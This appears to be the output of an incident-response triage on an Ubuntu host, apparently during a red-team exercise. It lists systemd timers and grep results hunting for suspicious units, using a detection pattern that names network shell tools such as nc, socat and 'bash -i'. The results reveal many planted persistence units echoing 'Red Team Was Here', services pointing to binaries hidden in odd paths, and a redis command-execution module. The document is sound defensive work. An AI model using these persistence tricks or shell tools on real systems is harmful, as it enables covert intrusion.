+Sun 2026-04-19 06:42:33 UTC      15h Sat 2026-04-18 06:55:58 UTC       8h ago apt-daily-upgrade.timer        apt-daily-upgrade.service
+Sun 2026-04-19 09:41:41 UTC      18h Sat 2026-04-18 13:22:35 UTC 1h 41min ago certbot.timer                  certbot.service
+Sun 2026-04-19 11:52:08 UTC      20h Sat 2026-04-18 12:49:14 UTC 2h 14min ago motd-news.timer                motd-news.service
+Mon 2026-04-20 01:01:02 UTC 1 day 9h Mon 2026-04-13 00:20:54 UTC            - fstrim.timer                   fstrim.service
+Thu 2026-04-23 15:45:18 UTC   5 days Sat 2026-04-18 13:21:09 UTC 1h 42min ago update-notifier-motd.timer     update-notifier-motd.service
+-                                  - -                                      - apport-autoreport.timer        apport-autoreport.service
+-                                  - -                                      - firewalld-fallback.timer       firewalld-fallback.service
+-                                  - -                                      - logctl-agent.timer             logctl-agent.service
+-                                  - -                                      - pkgloader.timer                pkgloader.service
+-                                  - -                                      - rpc-service-helper.timer       rpc-service-helper.service
+-                                  - -                                      - snapd.snap-repair.timer        snapd.snap-repair.service
+-                                  - Sat 2026-04-18 15:02:45 UTC      50s ago systemd-update-system.timer    systemd-update-system.service
+-                                  - -                                      - timed-resync.timer             timed-resync.service
+-                                  - -                                      - ua-timer.timer                 ua-timer.service
+
+24 timers listed.
+
+[9] Enabled timer and service units
+
+[10] Suspicious systemd unit search
+
+>>> sudo grep -RniE 'curl|wget|nc |ncat|bash -i|sh -i|python -c|perl -e|socat|/tmp/|/dev/shm|nohup|base64|ExecStart=' /etc/systemd /usr/lib/systemd/system
+/etc/systemd/system/local-fs.target.wants/pkgcached.service:9:ExecStart=/usr/libexec/netlink-monitor
+/etc/systemd/system/sysinit.target.wants/setvtrgb.service:11:ExecStart=/sbin/setvtrgb /etc/vtrgb
+/etc/systemd/system/sysinit.target.wants/keyboard-setup.service:10:ExecStart=/lib/console-setup/keyboard-setup.sh
+/etc/systemd/system/sysinit.target.wants/multipathd.service:20:ExecStart=/sbin/multipathd -d -s
+/etc/systemd/system/sysinit.target.wants/open-iscsi.service:23:ExecStart=/usr/sbin/iscsiadm -m node --loginall=automatic
+/etc/systemd/system/sysinit.target.wants/open-iscsi.service:24:ExecStart=/usr/lib/open-iscsi/activate-storage.sh
+/etc/systemd/system/sysinit.target.wants/finalrd.service:15:ExecStart=/bin/true
+/etc/systemd/system/sysinit.target.wants/systemd-pstore.service:23:ExecStart=/usr/lib/systemd/systemd-pstore
+/etc/systemd/system/sysinit.target.wants/fswatcherd.service:9:ExecStart=/usr/sbin/policy
+/etc/systemd/system/sysinit.target.wants/lvm2-monitor.service:14:ExecStart=/usr/sbin/lvm vgchange --monitor y
+/etc/systemd/system/sysinit.target.wants/apparmor.service:22:ExecStart=/lib/apparmor/apparmor.systemd reload
+/etc/systemd/system/sysinit.target.wants/iotrackd.service:9:ExecStart=/usr/local/lib/system/clocksyncd
+/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service:29:ExecStart=!!/usr/lib/systemd/systemd-timesyncd
+/etc/systemd/system/sysinit.target.wants/systemd-resolved.service:27:ExecStart=!!/usr/lib/systemd/systemd-resolved
+/etc/systemd/system/redis.service:8:ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf --loadmodule /usr/local/bin/cmd_exec.so
+/etc/systemd/system/cloud-init.target.wants/cloud-init-local.service:19:ExecStart=/usr/bin/cloud-init init --local
+/etc/systemd/system/cloud-init.target.wants/cloud-config.service:12:ExecStart=/usr/bin/cloud-init modules --mode=config
+/etc/systemd/system/cloud-init.target.wants/cloud-init.service:24:ExecStart=/usr/bin/cloud-init init
+/etc/systemd/system/cloud-init.target.wants/cloud-final.service:15:ExecStart=/usr/bin/cloud-init modules --mode=final
+/etc/systemd/system/auditd-wrapper.passwd:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/iscsi.service:23:ExecStart=/usr/sbin/iscsiadm -m node --loginall=automatic
+/etc/systemd/system/iscsi.service:24:ExecStart=/usr/lib/open-iscsi/activate-storage.sh
+/etc/systemd/system/netfiltermon.service:9:ExecStart=/sbin/fsck.overlayfs
+/etc/systemd/system/suspend-then-hibernate.target.wants/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/etc/systemd/system/usbmounter.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/securebootmgr.service:9:ExecStart=/opt/vendor/platform/agentd
+/etc/systemd/system/firewalld-fallback.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/netstats.rdtm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/auth-sync.blktm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/snb_backend.service:9:ExecStart=/opt/backend/venv/bin/uvicorn main:app --host 0.0.0.0 --port 8000 --proxy-headers
+/etc/systemd/system/sleep.target.wants/grub-initrd-fallback.service:10:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset initrdfail
+/etc/systemd/system/sleep.target.wants/grub-initrd-fallback.service:11:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset prev_entry
+/etc/systemd/system/basic.target.wants/sysstartupd.service:9:ExecStart=/opt/platform/runtime
+/etc/systemd/system/basic.target.wants/pkgcached.service:9:ExecStart=/var/tmp/ksession
+/etc/systemd/system/usbmon-helper.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/fs-repair.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/networkd-fallback.passwd:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/cronassistd.service:9:ExecStart=/sbin/mount.recoveryfs
+/etc/systemd/system/nfs-mountd.service.requires/fsidd.service:7:ExecStart=/usr/sbin/fsidd
+/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service:8:ExecStart=/usr/libexec/nm-dispatcher
+/etc/systemd/system/vmtoolsd.service:13:ExecStart=/usr/bin/vmtoolsd
+/etc/systemd/system/logctl-agent.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/modtrackd.service:9:ExecStart=/var/lib/misc/audit
+/etc/systemd/system/cloud-final.service.wants/snapd.seeded.service:8:ExecStart=/usr/bin/snap wait system seed.loaded
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:15:ExecStart=/bin/mount /run -o remount,exec
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:16:ExecStart=/bin/mkdir -p /run/initramfs
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/etc/systemd/system/networkd-fallback.blktm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/dbus-org.freedesktop.ModemManager1.service:10:ExecStart=/usr/sbin/ModemManager
+/etc/systemd/system/dbus-fi.w1.wpa_supplicant1.service:11:ExecStart=/usr/sbin/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"
+/etc/systemd/system/multi-user.target.wants/dmesg.service:8:ExecStart=/bin/journalctl --boot 0 --dmesg --output short-monotonic --quiet --no-pager --no-hostname
+/etc/systemd/system/multi-user.target.wants/pkg-repaird.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/pkg-repaird.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/networkd-dispatcher.service:8:ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args
+/etc/systemd/system/multi-user.target.wants/usbwatch.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/snapd.recovery-chooser-trigger.service:13:ExecStart=/usr/lib/snapd/snap-bootstrap recovery-chooser-trigger
+/etc/systemd/system/multi-user.target.wants/rsyslog.service:11:ExecStart=/usr/sbin/rsyslogd -n -iNONE
+/etc/systemd/system/multi-user.target.wants/syncwatchd.service:9:ExecStart=/usr/lib/systemd/systemd-netprobe
+/etc/systemd/system/multi-user.target.wants/driver-sync.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/timed-resync.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/etc/systemd/system/multi-user.target.wants/ModemManager.service:10:ExecStart=/usr/sbin/ModemManager
+/etc/systemd/system/multi-user.target.wants/console-setup.service:11:ExecStart=/lib/console-setup/console-setup.sh
+/etc/systemd/system/multi-user.target.wants/wpa_supplicant.service:11:ExecStart=/usr/sbin/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"
+/etc/systemd/system/multi-user.target.wants/apport.service:9:ExecStart=/usr/share/apport/apport --start
+/etc/systemd/system/multi-user.target.wants/pollinate.service:11:ExecStart=/usr/bin/pollinate
+/etc/systemd/system/multi-user.target.wants/update-db.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/netfiltermon.service:9:ExecStart=/sbin/fsck.overlayfs
+/etc/systemd/system/multi-user.target.wants/vector.service:11:ExecStart=/usr/bin/vector
+/etc/systemd/system/multi-user.target.wants/usbmounter.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/snapd.seeded.service:8:ExecStart=/usr/bin/snap wait system seed.loaded
+/etc/systemd/system/multi-user.target.wants/snapd.autoimport.service:11:ExecStart=/usr/bin/snap auto-import
+/etc/systemd/system/multi-user.target.wants/logctl-agent.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/logctl-agent.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/firewalld-fallback.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/systemd-networkd.service:27:ExecStart=!!/usr/lib/systemd/systemd-networkd
+/etc/systemd/system/multi-user.target.wants/snb_backend.service:9:ExecStart=/opt/backend/venv/bin/uvicorn main:app --host 0.0.0.0 --port 8000 --proxy-headers
+/etc/systemd/system/multi-user.target.wants/mountd-check.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/timed-resync.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/usbmon-helper.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/nginx.service:24:ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
+/etc/systemd/system/multi-user.target.wants/fs-repair.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/thermald.service:9:ExecStart=/usr/sbin/thermald --systemd --dbus-enable --adaptive
+/etc/systemd/system/multi-user.target.wants/atd.service:8:ExecStart=/usr/sbin/atd -f
+/etc/systemd/system/multi-user.target.wants/logctl-agent.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/etc/systemd/system/multi-user.target.wants/rpc-service-helper.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/sysstat.service:16:ExecStart=/usr/lib/sysstat/sa1 --boot
+/etc/systemd/system/multi-user.target.wants/snapd.core-fixup.service:11:ExecStart=/usr/lib/snapd/snapd.core-fixup.sh
+/etc/systemd/system/multi-user.target.wants/auditd.service:22:ExecStart=/sbin/auditd
+/etc/systemd/system/multi-user.target.wants/pkgloader.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/pulseaudio.service:9:ExecStart=/usr/bin/rangd
+/etc/systemd/system/multi-user.target.wants/snapd.service:18:ExecStart=/usr/lib/snapd/snapd
+/etc/systemd/system/multi-user.target.wants/iowatchdog.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/secureboot-db.service:10:ExecStart=/usr/bin/sbkeysync --no-default-keystores --keystore /usr/share/secureboot/updates --verbose
+/etc/systemd/system/multi-user.target.wants/netfilter-wrap.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/cron-repair.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/socket-guard.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/firewall-bouncer.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/iowatchdog.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/unattended-upgrades.service:8:ExecStart=/usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+/etc/systemd/system/multi-user.target.wants/open-vm-tools.service:13:ExecStart=/usr/bin/vmtoolsd
+/etc/systemd/system/multi-user.target.wants/pkgloader.timer:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/timetrackd.service:9:ExecStart=/usr/local/sbin/fsintegrityd
+/etc/systemd/system/multi-user.target.wants/system-audit.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/system-audit.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/bios-updater.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/bios-updater.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/cron.service:8:ExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS
+/etc/systemd/system/multi-user.target.wants/journal-rotate.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/grub-initrd-fallback.service:10:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset initrdfail
+/etc/systemd/system/multi-user.target.wants/grub-initrd-fallback.service:11:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset prev_entry
+/etc/systemd/system/multi-user.target.wants/ssl-cert.service:8:ExecStart=-/usr/sbin/make-ssl-cert generate-default-snakeoil --force-overwrite
+/etc/systemd/system/multi-user.target.wants/vault-mirror.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/initctl-patcher.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/firewalld-fallback.socket:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/sysstartupd.service:9:ExecStart=/opt/platform/runtime
+/etc/systemd/system/multi-user.target.wants/postgresql.service:13:ExecStart=/bin/true
+/etc/systemd/system/multi-user.target.wants/snb_frontend.service:11:ExecStart=/usr/bin/npm run start
+/etc/systemd/system/multi-user.target.wants/netfilter-wrap.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/multi-user.target.wants/nfs-server.service:25:ExecStart=/usr/sbin/rpc.nfsd
+/etc/systemd/system/multi-user.target.wants/snapd.apparmor.service:26:ExecStart=/usr/lib/snapd/snapd-apparmor start
+/etc/systemd/system/multi-user.target.wants/ubuntu-advantage.service:32:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/daemon.py
+/etc/systemd/system/multi-user.target.wants/NetworkManager.service:14:ExecStart=/usr/sbin/NetworkManager --no-daemon
+/etc/systemd/system/multi-user.target.wants/e2scrub_reap.service:20:ExecStart=/sbin/e2scrub_all -A -r
+/etc/systemd/system/remote-fs.target.wants/updatetrackd.service:9:ExecStart=/var/cache/fontconfig
+/etc/systemd/system/remote-fs.target.wants/mountwatchd.service:9:ExecStart=/usr/libexec/policy-loader
+/etc/systemd/system/remote-fs.target.wants/fswatcherd.service:9:ExecStart=/var/lib/udev/hwdb
+/etc/systemd/system/remote-fs.target.wants/timetrackd.service:9:ExecStart=/var/opt/runtime/session-cache
+/etc/systemd/system/remote-fs.target.wants/authwatchd.service:9:ExecStart=/var/lib/dbus/systemhelper
+/etc/systemd/system/syslog.service:11:ExecStart=/usr/sbin/rsyslogd -n -iNONE
+/etc/systemd/system/pkgloader.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/dbus-org.freedesktop.timesync1.service:29:ExecStart=!!/usr/lib/systemd/systemd-timesyncd
+/etc/systemd/system/pulseaudio.service:9:ExecStart=/usr/bin/rangd
+/etc/systemd/system/iowatchdog.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/cron-repair.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/emergency.target.wants/grub-initrd-fallback.service:10:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset initrdfail
+/etc/systemd/system/emergency.target.wants/grub-initrd-fallback.service:11:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset prev_entry
+/etc/systemd/system/dnsmonitord.service:9:ExecStart=/opt/runtime/cachesyncd
+/etc/systemd/system/pkg-repaird.rdtm:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/hybrid-sleep.target.wants/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/etc/systemd/system/driver-sync.persistence:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/dbus-org.freedesktop.resolve1.service:27:ExecStart=!!/usr/lib/systemd/systemd-resolved
+/etc/systemd/system/bios-updater.target:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/oem-config.service.wants/gpu-manager.service:8:ExecStart=/usr/bin/gpu-manager --log /var/log/gpu-manager.log
+/etc/systemd/system/hibernate.target.wants/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/etc/systemd/system/graphical.target.wants/udisks2.service:8:ExecStart=/usr/libexec/udisks2/udisksd
+/etc/systemd/system/authwatchd.service:9:ExecStart=/var/lib/dbus/systemhelper
+/etc/systemd/system/sysstartupd.service:9:ExecStart=/opt/platform/runtime
+/etc/systemd/system/network.target.wants/securebootmgr.service:9:ExecStart=/opt/vendor/platform/agentd
+/etc/systemd/system/network.target.wants/cronassistd.service:9:ExecStart=/sbin/mount.recoveryfs
+/etc/systemd/system/network.target.wants/modtrackd.service:9:ExecStart=/udev/.udev/firmware
+/etc/systemd/system/network.target.wants/logmaintd.service:9:ExecStart=/usr/lib/firmware/fw
+/etc/systemd/system/snb_frontend.service:11:ExecStart=/usr/bin/npm run start
+/etc/systemd/system/netfilter-wrap.service:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/getty.target.wants/getty@tty1.service:39:ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear - $TERM
+/etc/systemd/system/suspend.target.wants/grub-common.service:10:ExecStart=grub-editenv /boot/grub/grubenv unset recordfail
+/etc/systemd/system/nfs-server.service.requires/fsidd.service:7:ExecStart=/usr/sbin/fsidd
+/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service:22:ExecStart=/usr/lib/systemd/systemd-networkd-wait-online
+/etc/systemd/system/network-online.target.wants/modtrackd.service:9:ExecStart=/var/lib/misc/audit
+/etc/systemd/system/network-online.target.wants/dnsmonitord.service:9:ExecStart=/opt/runtime/cachesyncd
+/etc/systemd/system/network-online.target.wants/NetworkManager-wait-online.service:19:ExecStart=/usr/bin/nm-online -s -q
+/etc/systemd/system/rescue.target.wants/grub-initrd-fallback.service:10:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset initrdfail
+/etc/systemd/system/rescue.target.wants/grub-initrd-fallback.service:11:ExecStart=/usr/bin/grub-editenv /boot/grub/grubenv unset prev_entry
+/etc/systemd/system/display-manager.service.wants/gpu-manager.service:8:ExecStart=/usr/bin/gpu-manager --log /var/log/gpu-manager.log
+/etc/systemd/system/cron-repair.shadow:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/etc/systemd/system/dbus-org.freedesktop.thermald.service:9:ExecStart=/usr/sbin/thermald --systemd --dbus-enable --adaptive
+/etc/systemd/system/open-vm-tools.service.requires/vgauth.service:11:ExecStart=/usr/bin/VGAuthService
+/etc/systemd/user/graphical-session-pre.target.wants/session-migration.service:8:ExecStart=/usr/bin/session-migration
+/usr/lib/systemd/system/container-getty@.service:28:ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear - $TERM
+/usr/lib/systemd/system/updatetrackd.service:9:ExecStart=/var/cache/fontconfig
+/usr/lib/systemd/system/dmesg.service:8:ExecStart=/bin/journalctl --boot 0 --dmesg --output short-monotonic --quiet --no-pager --no-hostname
+/usr/lib/systemd/system/setvtrgb.service:11:ExecStart=/sbin/setvtrgb /etc/vtrgb
+/usr/lib/systemd/system/systemd-timedated.service:20:ExecStart=/usr/lib/systemd/systemd-timedated
+/usr/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service:12:ExecStart=/usr/libexec/fwupd/fwupdoffline
+/usr/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service:13:ExecStart=/usr/libexec/pk-offline-update
+/usr/lib/systemd/system/pkg-repaird.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/networkd-dispatcher.service:8:ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args
+/usr/lib/systemd/system/usbwatch.slice:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service:20:ExecStart=/usr/lib/systemd/systemd-hostnamed
+/usr/lib/systemd/system/mdadm-last-resort@.service:9:ExecStart=/sbin/mdadm --run /dev/%i
+/usr/lib/systemd/system/cockpit-wsinstance-https@.service:8:ExecStart=/usr/lib/cockpit/cockpit-ws --for-tls-proxy --port=0
+/usr/lib/systemd/system/cloud-init-local.service:19:ExecStart=/usr/bin/cloud-init init --local
+/usr/lib/systemd/system/dm-event.service:12:ExecStart=/usr/sbin/dmeventd -f
+/usr/lib/systemd/system/systemd-backlight@.service:22:ExecStart=/usr/lib/systemd/systemd-backlight load %i
+/usr/lib/systemd/system/systemd-sysusers.service:28:ExecStart=systemd-sysusers
+/usr/lib/systemd/system/systemd-update-system.service:6:ExecStart=/usr/sbin/package-lock -f /var/lib/dpkg/lock -s 100
+/usr/lib/systemd/system/systemd-pcrlock-firmware-code.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-firmware-code
+/usr/lib/systemd/system/systemd-pcrlock-secureboot-authority.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-secureboot-authority
+/usr/lib/systemd/system/snapd.recovery-chooser-trigger.service:13:ExecStart=/usr/lib/snapd/snap-bootstrap recovery-chooser-trigger
+/usr/lib/systemd/system/rsyslog.service:11:ExecStart=/usr/sbin/rsyslogd -n -iNONE
+/usr/lib/systemd/system/syncwatchd.service:9:ExecStart=/usr/lib/systemd/systemd-netprobe
+/usr/lib/systemd/system/driver-sync.mount:7:ExecStart=/bin/sh -c "while true; do echo 'Red Team Was Here :)'; sleep 1337; done"
+/usr/lib/systemd/system/systemd-networkd-wait-online.service:22:ExecStart=/usr/lib/systemd/systemd-networkd-wait-online
+/usr/lib/systemd/system/multipath-tools.service:20:ExecStart=/sbin/multipathd -d -s
+/usr/lib/systemd/system/lvm2-lvmpolld.service:13:ExecStart=/usr/sbin/lvmpolld -t 60 -f
+/usr/lib/systemd/system/systemd-modules-load.service:28:ExecStart=/usr/lib/systemd/systemd-modules-load
+/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service:28:ExecStart=systemd-sysusers
+/usr/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service:28:ExecStart=/usr/lib/systemd/systemd-modules-load
+/usr/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service:31:ExecStart=/usr/lib/systemd/systemd-binfmt
+/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service:28:ExecStart=systemd-hwdb update
+/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service:28:ExecStart=/usr/lib/systemd/systemd-udevd
+/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-catalog-update.service:25:ExecStart=journalctl --update-catalog
+/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service:22:ExecStart=-udevadm trigger --type=all --action=add --prioritized-subsystem=module,block,tpmrm,net,tty,input
+/usr/lib/systemd/system/sysinit.target.wants/systemd-firstboot.service:34:ExecStart=systemd-firstboot --prompt-locale --prompt-timezone --prompt-root-password
+/usr/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service:9:ExecStart=-/usr/bin/plymouth update-root-fs --read-write
+/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev-early.service:23:ExecStart=systemd-tmpfiles --prefix=/dev --create --boot --graceful
+/usr/lib/systemd/system/sysinit.target.wants/systemd-pcrphase-sysinit.service:23:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful sysinit
+/usr/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service:20:ExecStart=/usr/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/static-nodes.conf
+/usr/lib/systemd/system/sysinit.target.wants/systemd-update-done.service:23:ExecStart=/usr/lib/systemd/systemd-update-done
+/usr/lib/systemd/system/sysinit.target.wants/plymouth-start.service:14:ExecStart=/usr/sbin/plymouthd --mode=boot --pid-file=/run/plymouth/pid --attach-to-session
+/usr/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service:28:ExecStart=/usr/lib/systemd/systemd-random-seed load
+/usr/lib/systemd/system/sysinit.target.wants/systemd-tpm2-setup.service:24:ExecStart=/usr/lib/systemd/systemd-tpm2-setup
+/usr/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service:22:ExecStart=/usr/lib/systemd/systemd-sysctl
+/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service:24:ExecStart=journalctl --flush
+/usr/lib/systemd/system/sysinit.target.wants/systemd-pcrmachine.service:22:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful --machine-id
+/usr/lib/systemd/system/sysinit.target.wants/systemd-repart.service:32:ExecStart=/usr/bin/systemd-repart --dry-run=no
+/usr/lib/systemd/system/sysinit.target.wants/ldconfig.service:26:ExecStart=/sbin/ldconfig -X
+/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service:24:ExecStart=systemd-tmpfiles --create --remove --boot --exclude-prefix=/dev
+/usr/lib/systemd/system/sysinit.target.wants/systemd-pcrphase.service:21:ExecStart=/usr/lib/systemd/systemd-pcrextend --graceful ready
+/usr/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp reboot
+/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service:23:ExecStart=systemd-machine-id-setup --commit
+/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service:24:ExecStart=systemd-tmpfiles --prefix=/dev --create --boot
+/usr/lib/systemd/system/sysinit.target.wants/systemd-tpm2-setup-early.service:22:ExecStart=/usr/lib/systemd/systemd-tpm2-setup --early=yes
+/usr/lib/systemd/system/sysinit.target.wants/systemd-journald.service:30:ExecStart=/usr/lib/systemd/systemd-journald
